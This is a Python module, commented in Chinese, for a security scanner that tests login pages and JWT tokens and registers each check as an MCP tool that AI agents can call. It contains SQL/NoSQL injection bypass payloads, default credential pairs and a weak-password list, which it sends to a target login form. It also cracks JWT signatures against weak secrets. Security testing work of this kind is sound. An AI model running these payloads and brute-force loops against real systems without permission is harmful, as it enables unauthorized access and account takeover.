#!/usr/bin/env python3
"""
漏洞检测工具 - 认证类漏洞检测
包含: 认证绕过、弱密码、JWT漏洞
"""
import base64
import hashlib
import hmac
import json
import logging
from urllib.parse import urlparse, quote

from .._common import GLOBAL_CONFIG, HAS_REQUESTS, get_verify_ssl

if HAS_REQUESTS:
    import requests

logger = logging.getLogger(__name__)


# ============ 认证绕过检测 ============

AUTH_BYPASS_PAYLOADS = [
    # SQL注入绕过
    "admin'--",
    "admin'/*",
    "' or '1'='1",
    "' or ''='",
    "admin' or '1'='1",
    "') or ('1'='1",
    
    # NoSQL绕过
    '{"$gt": ""}',
    '{"$ne": ""}',
    
    # 默认凭证
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", "123456"),
    ("root", "root"),
    ("test", "test"),
    ("guest", "guest"),
    ("administrator", "administrator"),
]

AUTH_BYPASS_PATHS = [
    "/admin",
    "/administrator",
    "/admin.php",
    "/wp-admin",
    "/login",
    "/dashboard",
    "/manager",
    "/panel",
    "/.htaccess",
    "/config",
]


def auth_bypass_detect(url: str, username_param: str = "username", password_param: str = "password") -> dict:
    """认证绕过检测 - 检测登录页面的认证绕过漏洞"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    parsed = urlparse(url)
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    # 测试SQL注入绕过
    for payload in AUTH_BYPASS_PAYLOADS:
        try:
            if isinstance(payload, tuple):
                user, passwd = payload
            else:
                user = payload
                passwd = "test123"

            data = {username_param: user, password_param: passwd}
            resp = requests.post(url, data=data, timeout=10, verify=get_verify_ssl(), allow_redirects=False)

            # 检查是否绕过
            indicators = ["dashboard", "welcome", "logout", "admin panel", "管理", "登录成功", "session"]
            for indicator in indicators:
                if indicator.lower() in resp.text.lower():
                    vulns.append({
                        "type": "Authentication Bypass",
                        "severity": "CRITICAL",
                        "payload": f"{username_param}={user}, {password_param}={passwd}",
                        "evidence": indicator,
                        "url": url
                    })
                    break

            # 检查状态码和重定向
            if resp.status_code in [301, 302, 303, 307, 308]:
                location = resp.headers.get("Location", "")
                if any(path in location.lower() for path in ["dashboard", "admin", "panel", "home", "index"]):
                    vulns.append({
                        "type": "Authentication Bypass (Redirect)",
                        "severity": "CRITICAL",
                        "payload": f"{username_param}={user}",
                        "redirect_to": location,
                        "url": url
                    })
        except (requests.RequestException, OSError):
            logger.warning("Suppressed exception", exc_info=True)

    # 测试未授权访问
    for path in AUTH_BYPASS_PATHS[:5]:
        try:
            test_url = f"{base_url}{path}"
            resp = requests.get(test_url, timeout=10, verify=get_verify_ssl())

            if resp.status_code == 200 and len(resp.text) > 500:
                if any(kw in resp.text.lower() for kw in ["admin", "dashboard", "settings", "configuration"]):
                    vulns.append({
                        "type": "Unauthorized Access",
                        "severity": "HIGH",
                        "path": path,
                        "url": test_url
                    })
        except (requests.RequestException, OSError):
            logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "auth_vulns": vulns,
        "total": len(vulns),
        "recommendations": [
            "使用参数化查询防止SQL注入",
            "实施账户锁定机制",
            "使用强密码策略",
            "添加MFA多因素认证"
        ] if vulns else []
    }


# ============ 弱密码检测 ============

WEAK_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon",
    "123123", "baseball", "abc123", "football", "monkey",
    "letmein", "696969", "shadow", "master", "666666",
    "qwertyuiop", "123321", "mustang", "1234567890", "michael",
    "654321", "pussy", "superman", "1qaz2wsx", "7777777",
    "admin", "admin123", "root", "toor", "pass", "test",
]

COMMON_USERNAMES = [
    "admin", "administrator", "root", "user", "test",
    "guest", "info", "mysql", "oracle", "postgres",
    "support", "web", "www", "demo", "ftp",
]


def weak_password_detect(url: str, username_param: str = "username", password_param: str = "password", usernames: list = None) -> dict:
    """弱密码检测 - 检测常见弱密码"""
    if not HAS_REQUESTS:
        return {"success": False, "error": "需要安装 requests: pip install requests"}

    vulns = []
    test_usernames = usernames if usernames else COMMON_USERNAMES[:5]

    # 获取基线响应
    try:
        baseline_resp = requests.post(
            url,
            data={username_param: "nonexistent_user_xyz", password_param: "random_password_xyz"},
            timeout=10,
            verify=get_verify_ssl()
        )
        baseline_length = len(baseline_resp.text)
        baseline_status = baseline_resp.status_code
    except (requests.RequestException, OSError):
        logger.warning("Suppressed exception", exc_info=True)
        baseline_length = 0
        baseline_status = 200

    for user in test_usernames:
        for passwd in WEAK_PASSWORDS[:20]:  # 限制测试数量
            try:
                data = {username_param: user, password_param: passwd}
                resp = requests.post(url, data=data, timeout=10, verify=get_verify_ssl(), allow_redirects=False)

                # 判断是否成功
                len_diff = abs(len(resp.text) - baseline_length)
                status_diff = resp.status_code != baseline_status

                # 成功指标
                success_indicators = ["welcome", "dashboard", "logout", "success", "登录成功", "session"]
                failure_indicators = ["invalid", "error", "failed", "incorrect", "wrong", "失败", "错误"]

                is_success = False
                if any(ind in resp.text.lower() for ind in success_indicators):
                    if not any(fail in resp.text.lower() for fail in failure_indicators):
                        is_success = True

                if is_success or (status_diff and resp.status_code in [301, 302]):
                    vulns.append({
                        "type": "Weak Password",
                        "severity": "HIGH",
                        "username": user,
                        "password": passwd,
                        "url": url
                    })
                    break  # 找到一个用户的弱密码就跳过该用户
            except (requests.RequestException, OSError):
                logger.warning("Suppressed exception", exc_info=True)

    return {
        "success": True,
        "url": url,
        "weak_password_vulns": vulns,
        "total": len(vulns),
        "tested_users": len(test_usernames),
        "recommendations": [
            "强制使用强密码策略",
            "实施账户锁定机制",
            "添加验证码防止暴力破解",
            "启用MFA"
        ] if vulns else []
    }


# ============ JWT漏洞检测 ============

def jwt_vuln_detect(token: str = None, url: str = None) -> dict:
    """JWT漏洞检测 - 检测JWT令牌的常见漏洞"""
    vulns = []

    if token:
        # 解析JWT
        try:
            parts = token.split(".")
            if len(parts) != 3:
                return {"success": False, "error": "无效的JWT格式"}

            # 解码header和payload
            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)

            header = json.loads(base64.urlsafe_b64decode(header_b64))
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))

            # 检查alg=none漏洞
            alg = header.get("alg", "").lower()
            if alg in ["none", "null", ""]:
                vulns.append({
                    "type": "JWT Algorithm None",
                    "severity": "CRITICAL",
                    "detail": "JWT使用'none'算法，签名可被绕过"
                })

            # 检查弱密钥
            if alg in ["hs256", "hs384", "hs512"]:
                weak_secrets = ["secret", "password", "123456", "key", "jwt_secret", ""]
                for secret in weak_secrets:
                    try:
                        # 尝试验证签名
                        signing_input = f"{parts[0]}.{parts[1]}"
                        expected_sig = base64.urlsafe_b64encode(
                            hmac.new(secret.encode(), signing_input.encode(), hashlib.sha256).digest()
                        ).rstrip(b"=").decode()

                        if expected_sig == parts[2]:
                            vulns.append({
                                "type": "JWT Weak Secret",
                                "severity": "CRITICAL",
                                "secret": secret,
                                "detail": f"JWT使用弱密钥: '{secret}'"
                            })
                            break
                    except (ValueError, KeyError, TypeError):
                        logger.warning("Suppressed exception", exc_info=True)

            # 检查payload中的敏感信息
            sensitive_keys = ["password", "secret", "key", "token", "credit_card", "ssn"]
            for key in payload:
                if any(s in key.lower() for s in sensitive_keys):
                    vulns.append({
                        "type": "JWT Sensitive Data Exposure",
                        "severity": "MEDIUM",
                        "field": key,
                        "detail": f"JWT payload包含敏感字段: {key}"
                    })

            # 检查过期时间
            exp = payload.get("exp")
            if exp is None:
                vulns.append({
                    "type": "JWT No Expiration",
                    "severity": "MEDIUM",
                    "detail": "JWT没有设置过期时间"
                })

            # 检查kid注入
            kid = header.get("kid")
            if kid and any(c in str(kid) for c in ["'", '"', ";", "|", "&", "/"]):
                vulns.append({
                    "type": "JWT KID Injection Risk",
                    "severity": "HIGH",
                    "kid": kid,
                    "detail": "JWT kid参数可能存在注入风险"
                })

            return {
                "success": True,
                "jwt_header": header,
                "jwt_payload": payload,
                "jwt_vulns": vulns,
                "total": len(vulns)
            }

        except Exception as e:
            logger.warning("Suppressed exception", exc_info=True)
            return {"success": False, "error": f"JWT解析失败: {str(e)}"}

    elif url:
        # 从URL获取JWT并测试
        if not HAS_REQUESTS:
            return {"success": False, "error": "需要安装 requests: pip install requests"}

        try:
            resp = requests.get(url, timeout=10, verify=get_verify_ssl())
            
            # 尝试从响应中提取JWT
            jwt_pattern = r'eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*'
            import re
            matches = re.findall(jwt_pattern, resp.text)
            
            if matches:
                return jwt_vuln_detect(token=matches[0])
            else:
                return {"success": False, "error": "未在响应中找到JWT"}
        except Exception as e:
            logger.warning("Suppressed exception", exc_info=True)
            return {"success": False, "error": f"请求失败: {str(e)}"}

    return {"success": False, "error": "需要提供token或url参数"}


# ============ MCP工具注册 ============

def register_auth_tools(mcp) -> None:
    """注册认证类检测工具到MCP服务器"""
    
    @mcp.tool()
    def auth_bypass_detect_tool(url: str, username_param: str = "username", password_param: str = "password") -> dict:
        """认证绕过检测 - 检测登录页面的认证绕过漏洞"""
        return auth_bypass_detect(url, username_param, password_param)
    
    @mcp.tool()
    def weak_password_detect_tool(url: str, username_param: str = "username", password_param: str = "password", usernames: list = None) -> dict:
        """弱密码检测 - 检测常见弱密码"""
        return weak_password_detect(url, username_param, password_param, usernames)
    
    @mcp.tool()
    def jwt_vuln_detect_tool(token: str = None, url: str = None) -> dict:
        """JWT漏洞检测 - 检测JWT令牌的常见漏洞"""
        return jwt_vuln_detect(token, url)
    
    logger.info("已注册认证类漏洞检测工具: auth_bypass, weak_password, jwt_vuln")


__all__ = [
    "auth_bypass_detect",
    "weak_password_detect",
    "jwt_vuln_detect",
    "register_auth_tools",
]